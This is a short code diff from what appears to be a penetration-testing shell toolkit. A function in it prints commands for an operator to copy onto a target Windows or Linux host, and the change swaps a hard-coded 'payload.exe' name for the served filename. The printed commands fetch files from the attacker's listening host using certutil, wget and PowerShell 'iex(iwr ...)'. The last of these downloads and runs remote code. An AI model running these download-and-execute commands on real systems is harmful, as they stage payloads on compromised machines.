@@ -48,7 +48,7 @@ nb-srv-file-download() {
     clear
 
     __ask "Choose a command to copy:"
-    echo "1.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\payload.exe"
+    echo "1.  certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
     echo "2.  wget http://${__LHOST}:${__LPORT}/$filename"
     echo "3.  iex(iwr http://${__LHOST}:${__LPORT}/$filename)"
     echo "4.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
